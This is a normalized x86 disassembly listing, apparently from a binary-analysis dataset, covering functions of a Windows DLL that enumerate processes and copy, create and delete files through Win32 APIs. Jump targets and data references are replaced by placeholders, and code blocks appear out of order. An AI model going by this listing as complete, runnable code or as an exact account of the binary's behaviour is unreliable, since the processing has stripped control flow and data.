push edi
lea ecx [ ebp - 0x44 ]
call sub_100023ce
mov eax ebx
call sub_10023f0b
retn
sub_1001217f
push 0x60
mov eax sub_10049b6d
call sub_10023e33
test edi edi
jne r-xdata
mov esi 0x22c
push esi
push 0x0
push edi
call sub_100209e0
mov eax [ ebp + 0x8 ]
add esp 0xc
mov [ edi ] esi
mov eax [ eax + 0x4 ]
push edi
push eax
call Process32FirstW
xor ebx ebx
mov esi eax
inc ebx
cmp esi ebx
je r-xdata
push r--data
lea ecx [ ebp - 0x44 ]
call sub_10001d1f
and [ ebp - 0x4 ] edi
lea eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x6c ]
call sub_10001d6b
push r--data
lea eax [ ebp - 0x6c ]
push eax
call sub_10023a01
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001d1f
lea eax [ ebp - 0x28 ]
push eax
cmp esi ebx
setne al
movzx eax al
push eax
mov [ ebp - 0x4 ] ebx
call sub_1001147a
pop ecx
pop ecx
push 0x0
push ebx
lea ecx [ ebp - 0x28 ]
call sub_100023ce
mov al bl
call [ GetLastError@IAT ]
cmp eax 0x12
jne r-xdata
xor al al
jmp r-xdata
call sub_10023f0b
retn 0x4
sub_1001222a
push 0x60
mov eax sub_10049b6d
call sub_10023e33
test edi edi
jne r-xdata
mov esi 0x22c
push esi
push 0x0
push edi
call sub_100209e0
mov eax [ ebp + 0x8 ]
add esp 0xc
mov [ edi ] esi
mov eax [ eax + 0x4 ]
push edi
push eax
call Process32NextW
xor ebx ebx
mov esi eax
inc ebx
cmp esi ebx
je r-xdata
push r--data
lea ecx [ ebp - 0x44 ]
call sub_10001d1f
and [ ebp - 0x4 ] edi
lea eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x6c ]
call sub_10001d6b
push r--data
lea eax [ ebp - 0x6c ]
push eax
call sub_10023a01
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001d1f
lea eax [ ebp - 0x28 ]
push eax
cmp esi ebx
setne al
movzx eax al
push eax
mov [ ebp - 0x4 ] ebx
call sub_1001147a
pop ecx
pop ecx
push 0x0
push ebx
lea ecx [ ebp - 0x28 ]
call sub_100023ce
mov al bl
call [ GetLastError@IAT ]
cmp eax 0x12
jne r-xdata
xor al al
jmp r-xdata
call sub_10023f0b
retn 0x4
sub_100122d5
push 0x1c
mov eax sub_1004993b
call sub_10023e33
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
push 0x0
push eax
push ecx
call [ CopyFileW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov edi eax
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
cmp edi 0x1
setne al
movzx eax al
push eax
call sub_1001147a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100023ce
call sub_10023f0b
retn
sub_10012344
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10049b2f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x94
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8c ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xa0 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ esp + 0x18 ] eax
xor ecx ecx
cmp [ ebx + 0x18 ] 0x8
lea eax [ ebx + 0x4 ]
mov [ esp + 0x10 ] ecx
mov [ esp + 0x14 ] eax
jb r-xdata
mov esi [ GetEnvironmentVariableW@IAT ]
push ecx
push ecx
push eax
call esi
mov edi r--data
push edi
lea ecx [ esp + 0x20 ]
mov [ esp + 0x14 ] eax
call sub_10001d1f
and [ esp + 0xa8 ] 0x0
cmp [ esp + 0x10 ] 0x0
lea eax [ esp + 0x1c ]
push eax
sete al
movzx eax al
push eax
call sub_1001147a
or [ esp + 0xb0 ] 0xffffffff
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ esp + 0x24 ]
call sub_100023ce
push 0x0
push [ esp + 0x14 ]
lea ecx [ esp + 0x84 ]
call sub_10004853
mov [ esp + 0xa8 ] 0x1
cmp [ esp + 0x94 ] 0x8
mov ecx [ esp + 0x80 ]
jae r-xdata
mov eax [ eax ]
cmp [ ebx + 0x18 ] 0x8
mov eax [ esp + 0x14 ]
jb r-xdata
lea ecx [ esp + 0x80 ]
push [ esp + 0x90 ]
push ecx
push eax
call esi
push edi
lea ecx [ esp + 0x20 ]
mov esi eax
call sub_10001d1f
lea eax [ esp + 0x1c ]
push eax
test esi esi
sete al
movzx eax al
push eax
mov [ esp + 0xb0 ] 0x2
call sub_1001147a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ esp + 0x24 ]
mov [ esp + 0xb0 ] 0x1
call sub_100023ce
inc esi
cmp [ esp + 0x10 ] esi
je r-xdata
mov eax [ eax ]
cmp [ esp + 0x94 ] 0x8
mov eax [ esp + 0x80 ]
jae r-xdata
push r--data
lea ecx [ esp + 0x3c ]
call sub_10001d1f
lea eax [ esp + 0x38 ]
push eax
lea ecx [ esp + 0x58 ]
mov [ esp + 0xac ] 0x3
call sub_10001d6b
push r--data
lea eax [ esp + 0x58 ]
push eax
call sub_10023a01
mov ecx [ esp + 0x18 ]
push eax
call sub_100012f3
push 0x0
push 0x1
lea ecx [ esp + 0x84 ]
call sub_10002597
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0xa0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x8c ]
xor ecx esp
call sub_10020040
mov esp ebp
pop ebp
retn
lea eax [ esp + 0x80 ]
sub_1001250f
push 0x27c
mov eax sub_10049ae1
call sub_10023e9c
xor edi edi
push 0x20a
lea eax [ ebp - 0x224 ]
push edi
push eax
mov esi ecx
mov [ ebp - 0x228 ] edi
call sub_100209e0
add esp 0xc
cmp [ esi + 0x18 ] 0x8
jb r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
lea eax [ ebp - 0x224 ]
push eax
mov ecx ebx
call sub_100012f3
mov eax ebx
call sub_10023f1f
retn
push r--data
lea ecx [ ebp - 0x260 ]
call sub_10001d1f
lea eax [ ebp - 0x260 ]
push eax
lea ecx [ ebp - 0x288 ]
mov [ ebp - 0x4 ] edi
call sub_10001d6b
push r--data
lea eax [ ebp - 0x288 ]
push eax
call sub_10023a01
lea eax [ ebp - 0x224 ]
push eax
push edi
push edi
push esi
call [ GetTempFileNameW@IAT ]
push r--data
lea ecx [ ebp - 0x244 ]
mov esi eax
call sub_10001d1f
lea eax [ ebp - 0x244 ]
push eax
cmp esi edi
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] edi
call sub_1001147a
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push edi
xor edi edi
inc edi
push edi
lea ecx [ ebp - 0x244 ]
call sub_100023ce
cmp esi 0x6f
jne r-xdata
sub_100125ec
push 0x1c
mov eax sub_1004993b
call sub_10023e33
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push eax
call [ DeleteFileW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov esi eax
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
cmp esi 0x1
setne al
movzx eax al
push eax
call sub_1001147a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100023ce
call sub_10023f0b
retn
sub_1001264a
push 0x20
mov eax sub_100498f5
call sub_10023e33
push ebx
push [ ebp + 0x8 ]
lea edi [ ebp - 0x28 ]
call sub_1001269f
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
push eax
mov ecx esi
call sub_10001d6b
push 0x0
push 0x1
mov ecx edi
mov [ esi ] r--data
call sub_100023ce
mov [ esi ] r--data
mov [ esi + 0x28 ] ebx
mov eax esi
call sub_10023f0b
retn 0x4
sub_1001269f
push 0xd4
mov eax sub_1004936c
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4c ] eax
lea eax [ ebp + 0xc ]
xor esi esi
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x50 ] esi
call sub_10012850
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x2c ]
call sub_100127b6
pop ecx
push [ ebp - 0x4c ]
xor ebx ebx
lea eax [ ebp - 0xdc ]
inc ebx
push eax
mov [ ebp - 0x4 ] bl
call sub_10012886
push r--data
push eax
lea eax [ ebp - 0xa4 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_100128d3
add esp 0x14
lea ecx [ ebp - 0x48 ]
push ecx
push eax
lea eax [ ebp - 0x88 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_1001291a
add esp 0xc
push r--data
push eax
lea eax [ ebp - 0xc0 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_100128d3
add esp 0xc
lea ecx [ ebp - 0x2c ]
push ecx
push eax
lea eax [ ebp - 0x6c ]
push eax
mov [ ebp - 0x4 ] 0x5
call sub_1001291a
add esp 0xc
push r--data
push eax
push edi
mov [ ebp - 0x4 ] 0x6
call sub_100128d3
add esp 0xc
push esi
push ebx
lea ecx [ ebp - 0x6c ]
call sub_100023ce
push esi
push ebx
lea ecx [ ebp - 0xc0 ]
call sub_100023ce
push esi
push ebx
lea ecx [ ebp - 0x88 ]
call sub_100023ce
push esi
push ebx
lea ecx [ ebp - 0xa4 ]
call sub_100023ce
push esi
push ebx
lea ecx [ ebp - 0xdc ]
call sub_100023ce
push esi
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100023ce
push esi
push ebx
lea ecx [ ebp - 0x48 ]
call sub_100023ce
mov eax edi
call sub_10023f1f
retn
sub_100127b6
push 0x28
mov eax sub_10049007
call sub_10023e33
xor esi esi
push esi
push esi
lea eax [ ebp - 0x10 ]
push eax
push 0x400
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] esi
push esi
mov edi ecx
mov [ ebp - 0x18 ] esi
push 0x1300
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] esi
call [ FormatMessageA@IAT ]
mov ebx eax
cmp ebx 0x4
jbe r-xdata
push r--data
mov ecx edi
call sub_10001d1f
xor edi edi
mov [ ebp - 0x4 ] esi
inc edi
mov [ ebp - 0x18 ] edi
cmp [ ebp - 0x10 ] esi
je r-xdata
sub ebx 0x3
mov eax [ ebp - 0x14 ]
call sub_10023f0b
retn
cmp ebx esi
jbe r-xdata
cmp [ ebp - 0x10 ] esi
je r-xdata
push ebx
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x34 ]
call sub_10010f73
push 0xffffffff
push esi
mov [ ebp - 0x4 ] edi
mov ecx [ ebp - 0x14 ]
push eax
call sub_100021b2
push esi
push edi
lea ecx [ ebp - 0x34 ]
call sub_100023ce
push [ ebp - 0x10 ]
call [ LocalFree@IAT ]
sub_10012850
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x1c ] 0x0
push edi
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
mov edi ecx
call sub_10012965
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
mov eax edi
xor ecx ebp
pop edi
call sub_10020040
leave
retn
sub_10012886
push 0x20
mov eax sub_10049989
call sub_10023e33
and [ ebp - 0x10 ] 0x0
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001d1f
and [ ebp - 0x4 ] 0x0
push 0xffffffff
push 0x0
push [ ebp + 0xc ]
mov ecx eax
call sub_10006f9b
mov ecx [ ebp + 0x8 ]
push eax
call sub_10001daa
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
mov eax [ ebp + 0x8 ]
call sub_10023f0b
retn
sub_100128d3
push 0x20
mov eax sub_10049989
call sub_10023e33
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_10001daa
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
mov ecx eax
call sub_10013227
mov ecx [ ebp + 0x8 ]
push eax
call sub_10001daa
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
mov eax [ ebp + 0x8 ]
call sub_10023f0b
retn
sub_1001291a
push 0x20
mov eax sub_10049989
call sub_10023e33
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_10001daa
and [ ebp - 0x4 ] 0x0
push 0xffffffff
push 0x0
push [ ebp + 0x10 ]
mov ecx eax
call sub_10006f9b
mov ecx [ ebp + 0x8 ]
push eax
call sub_10001daa
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
mov eax [ ebp + 0x8 ]
call sub_10023f0b
retn
sub_10012965
push 0xc
mov eax sub_10048ccf
call sub_10023e33
mov eax [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
mov ecx edi
mov [ ebp - 0x14 ] edi
lea esi [ eax + 0x13 ]
call sub_10007ee2
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x10 ] 0x1
call sub_100129ae
pop ecx
push [ ebp - 0x14 ]
push esi
push eax
push edi
call sub_10012ba1
mov eax edi
call sub_10023f0b
retn
sub_100129ae
push 0x30
mov eax sub_10048c91
call sub_10023e9c
mov esi ecx
lea ecx [ ebp - 0x34 ]
call sub_1000710a
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x34 ]
push eax
call sub_10012b04
mov edi eax
pop ecx
lea eax [ ebp - 0x2c ]
push eax
mov ecx edi
call sub_10005db0
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
test eax eax
je r-xdata
mov [ ebp - 0x2d ] 0x0
mov eax [ edi ]
mov ecx edi
call [ eax + 0x8 ]
mov [ ebp - 0x2d ] al
jmp r-xdata
xor edi edi
lea eax [ ebp - 0x2c ]
call sub_1000ee03
mov bl [ eax ]
mov bl 0x7f
jmp r-xdata
and [ ebp - 0x38 ] 0x0
xor edi edi
lea eax [ ebp - 0x2c ]
call sub_1000ee03
cmp [ eax ] 0x0
jg r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
push 0xa
pop edi
div edi
dec cl
dec esi
add dl 0x30
mov [ esi ] dl
mov [ ebp + 0x8 ] eax
test eax eax
jne r-xdata
mov edi [ ebp - 0x38 ]
inc edi
mov [ ebp - 0x38 ] edi
cmp edi [ ebp - 0x3c ]
jae r-xdata
mov cl bl
test cl cl
jne r-xdata
push eax
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
lea ecx [ ebp - 0x34 ]
call sub_10007b41
mov eax esi
call sub_10023f1f
retn
mov al [ ebp - 0x2d ]
dec esi
mov cl bl
mov [ esi ] al
lea eax [ ebp - 0x2c ]
call sub_1000ee03
mov al [ eax ]
mov bl 0x7f
test al al
jle r-xdata
mov bl al
sub_10012b04
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10012be8
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_10012ba1
push ebp
mov ebp esp
and esp 0xfffffff8
mov ecx [ ebp + 0x8 ]
sub esp 0x10
push esi
push edi
lea eax [ esp + 0x8 ]
push eax
call sub_10007ebd
mov esi [ eax ]
mov edi [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
lea eax [ esp + 0x10 ]
push eax
call sub_10007e4e
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
push [ ebp + 0xc ]
push edi
push esi
push [ eax + 0x4 ]
push [ eax ]
call sub_10012d9b
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x10
sub_10012be8
push 0x98
mov eax sub_10048b2b
call sub_10023e33
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp eax edi
je r-xdata
push 0x4
pop eax
call sub_10023f0b
retn
cmp [ eax ] edi
jne r-xdata
push 0x18
call sub_10020186
pop ecx
mov [ ebp - 0x14 ] eax
xor ebx ebx
inc ebx
push 0x3
mov [ ebp - 0x4 ] edi
pop esi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x30 ]
push eax
call sub_100076e4
mov [ ebp - 0x4 ] bl
push eax
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x10 ] ebx
call sub_1000768f
push ebx
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x14 ]
push edi
push eax
mov [ ebp - 0x10 ] esi
call sub_10012c8b
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa4 ]
call sub_10007701
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] esi
test [ ebp - 0x10 ] 0x2
mov [ ecx ] eax
je r-xdata
push edi
push ebx
lea ecx [ ebp - 0x30 ]
call sub_100023ce
sub_10012c8b
push 0x4
mov eax sub_100488b7
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
mov [ esi ] r--data
call sub_10012cc1
mov eax esi
call sub_10023f0b
retn 0xc
sub_10012cc1
push 0xc
mov eax sub_10048894
call sub_10023e66
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_100208a9
xor ebx ebx
mov edi eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
call sub_1001b693
lea eax [ ebp - 0x18 ]
push eax
push ebx
push [ edi + 0x8 ]
call sub_10006a1a
add esp 0xc
mov [ esi + 0x8 ] eax
call sub_1001b693
lea eax [ ebp - 0x18 ]
push eax
push ebx
push r--data
call sub_10006a1a
add esp 0xc
mov [ esi + 0x10 ] eax
call sub_1001b693
lea eax [ ebp - 0x18 ]
push eax
push ebx
push r--data
call sub_10006a1a
or [ ebp - 0x4 ] 0xffffffff
add esp 0xc
mov [ esi + 0x14 ] eax
call sub_1001b693
mov eax [ edi ]
mov al [ eax ]
mov [ esi + 0xc ] al
call sub_1001b693
mov eax [ edi + 0x4 ]
mov al [ eax ]
mov [ esi + 0xd ] al
cmp [ ebp + 0xc ] bl
je r-xdata
call sub_10023f0b
retn 0x8
call sub_1001b693
lea eax [ ebp - 0x18 ]
push eax
push ebx
push r--data
call sub_10006a1a
add esp 0xc
mov [ esi + 0x8 ] eax
call sub_1001b693
mov [ esi + 0xc ] 0x2e
call sub_1001b693
mov [ esi + 0xd ] 0x2c
sub_10012d9b
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ecx
push [ esp + 0x4 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10012dc4
mov esp ebp
pop ebp
retn 0x18
sub_10012dc4
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10048c59
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x1c ]
mov eax [ ebp + 0x18 ]
mov esi ecx
push eax
lea ecx [ esp + 0x14 ]
call sub_10012eab
and [ esp + 0x38 ] 0x0
lea eax [ esp + 0xc ]
push eax
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10012e55
push 0x0
push 0x1
lea ecx [ esp + 0x14 ]
call sub_100023ce
mov eax esi
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ esp + 0x20 ]
xor ecx esp
call sub_10020040
mov esp ebp
pop ebp
retn 0x1c
sub_10012e55
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
lea eax [ ebp - 0x10 ]
push eax
mov ebx ecx
call sub_10007e4e
push [ ebp + 0xc ]
mov esi [ eax ]
push [ ebp + 0x8 ]
mov edi [ eax + 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_10013210
push edi
push esi
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
push [ ebp + 0x8 ]
call sub_10013210
add esp 0x20
push 0xffffffff
push 0x0
push [ ebp + 0x18 ]
mov ecx ebx
push [ ebp - 0x8 ]
push eax
call sub_10012f29
pop edi
pop esi
pop ebx
leave
retn 0x14
sub_10012eab
push ebp
mov ebp esp
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0xf
call sub_10002493
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10012ed6
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10012ed6
push 0x8
mov eax sub_10048c36
call sub_10023e66
mov [ ebp - 0x14 ] ecx
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
sub eax esi
push eax
call sub_10006a43
and [ ebp - 0x4 ] 0x0
call sub_10023f0b
retn 0xc
movzx eax [ esi ]
mov ecx [ ebp - 0x14 ]
push eax
push 0x1
call sub_10005af7
inc esi
jmp r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
sub_10012f29
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp [ edi + 0x14 ] esi
jb r-xdata
call sub_1001b037
mov eax [ ebp + 0x10 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp + 0x14 ]
jae r-xdata
mov ecx [ edi + 0x14 ]
mov eax ecx
sub eax esi
cmp eax [ ebp + 0xc ]
jae r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax + 0x14 ]
sub eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x18 ]
jae r-xdata
mov [ ebp + 0xc ] eax
sub ecx [ ebp + 0xc ]
or eax 0xffffffff
sub eax [ ebp + 0x18 ]
cmp eax ecx
ja r-xdata
mov [ ebp + 0x18 ] eax
mov eax [ edi + 0x14 ]
mov ecx eax
sub ecx [ ebp + 0xc ]
mov ebx eax
add ecx [ ebp + 0x18 ]
sub ebx esi
sub ebx [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
mov [ ebp + 0x8 ] ebx
cmp eax ecx
jae r-xdata
call sub_1001afff
cmp edi [ ebp + 0x10 ]
je r-xdata
push 0x0
push ecx
mov ecx edi
call sub_10002419
mov eax [ ebp + 0xc ]
lea ebx [ edi + 0x4 ]
cmp [ ebp + 0x18 ] eax
ja r-xdata
mov eax [ edi + 0x18 ]
cmp eax 0x10
jb r-xdata
cmp [ ebp + 0x14 ] esi
ja r-xdata
mov eax [ edi + 0x18 ]
cmp eax 0x10
jb r-xdata
lea edx [ edi + 0x4 ]
mov edx [ edi + 0x4 ]
jmp r-xdata
add eax esi
cmp eax [ ebp + 0x14 ]
mov eax [ edi + 0x18 ]
ja r-xdata
mov eax [ edi + 0x18 ]
cmp eax 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
cmp eax 0x10
jb r-xdata
cmp eax 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov [ ebp + 0x10 ] ebx
mov edx [ ebx ]
mov [ ebp + 0x10 ] edx
jmp r-xdata
cmp eax 0x10
jb r-xdata
lea edx [ eax + 0x4 ]
mov edx [ eax + 0x4 ]
jmp r-xdata
add edx esi
add edx [ ebp + 0xc ]
push ebx
sub eax esi
sub eax [ ebp + 0x18 ]
push edx
add ecx esi
add ecx [ ebp + 0x18 ]
push eax
push ecx
call sub_10002127
mov eax [ ebp + 0x10 ]
add esp 0x10
cmp [ eax + 0x18 ] 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov [ ebp + 0x10 ] ebx
mov edx [ ebx ]
mov [ ebp + 0x10 ] edx
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
push [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
add ecx edx
sub eax esi
push ecx
push eax
mov eax [ ebp + 0x10 ]
add eax esi
push eax
call sub_10002127
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x10
jb r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
mov eax [ edi + 0x18 ]
cmp eax 0x10
jb r-xdata
mov [ ebp + 0x10 ] ebx
mov edx [ ebx ]
mov [ ebp + 0x10 ] edx
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov [ ebp + 0x10 ] ebx
mov edx [ ebx ]
mov [ ebp + 0x10 ] edx
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
push [ ebp + 0x8 ]
sub eax esi
sub eax [ ebp + 0x18 ]
add ecx esi
add ecx [ ebp + 0xc ]
push ecx
push eax
mov eax [ ebp + 0x10 ]
add eax esi
add eax [ ebp + 0x18 ]
push eax
call sub_10002127
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x10
jb r-xdata
push [ ebp + 0x8 ]
add ecx esi
add ecx [ ebp + 0xc ]
sub eax esi
sub eax [ ebp + 0x18 ]
add ebx esi
add ebx [ ebp + 0x18 ]
jmp r-xdata
mov ebx [ ebx ]
cmp eax 0x10
jb r-xdata
add esp 0x10
push [ ebp - 0x4 ]
mov ecx edi
call sub_10002493
mov eax edi
pop edi
pop esi
pop ebx
leave
retn 0x14
push [ ebp + 0x18 ]
mov ebx [ ebp + 0x14 ]
add edx ebx
push edx
sub eax esi
push eax
add ecx esi
push ecx
call sub_10002477
jmp r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
push [ ebp + 0xc ]
mov edx [ ebp + 0x14 ]
add ecx edx
sub eax esi
push ecx
push eax
mov eax [ ebp + 0x10 ]
add eax esi
push eax
call sub_10002127
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
push [ ebp + 0x8 ]
sub eax esi
sub eax [ ebp + 0x18 ]
add ecx esi
add ecx [ ebp + 0xc ]
push ecx
push eax
mov eax [ ebp + 0x10 ]
add eax esi
add eax [ ebp + 0x18 ]
push eax
call sub_10002127
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x10
jb r-xdata
mov edx [ ebp + 0x14 ]
add ecx edx
mov ebx [ ebx ]
cmp eax 0x10
jb r-xdata
push ecx
push eax
push ebx
call sub_10002127
mov [ ebp + 0x10 ] ebx
mov edx [ ebx ]
mov [ ebp + 0x10 ] edx
jmp r-xdata
cmp eax 0x10
jb r-xdata
sub ecx [ ebp + 0xc ]
add ecx [ ebp + 0x14 ]
add ecx [ ebp + 0x18 ]
jmp r-xdata
mov ebx [ ebx ]
cmp eax 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
push [ ebp + 0x8 ]
sub eax esi
sub eax [ ebp + 0x18 ]
add ecx esi
add ecx [ ebp + 0xc ]
push ecx
push eax
mov eax [ ebp + 0x10 ]
add eax esi
add eax [ ebp + 0x18 ]
push eax
call sub_10002127
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x10
jb r-xdata
push [ ebp + 0x18 ]
sub eax esi
add ebx esi
jmp r-xdata
mov edx [ ebp + 0x18 ]
sub edx [ ebp + 0xc ]
sub eax esi
sub eax [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x14 ]
add ecx edx
add ecx [ ebp + 0x18 ]
add ebx esi
add ebx [ ebp + 0xc ]
mov ebx [ ebx ]
cmp eax 0x10
jb r-xdata
sub_10013244
push 0x44
mov eax sub_10048fcb
call sub_10023e33
push 0x10
push 0x0
push [ ebp + 0x8 ]
call sub_100209e0
add esp 0xc
push [ ebp + 0x8 ]
call [ CoCreateGuid@IAT ]
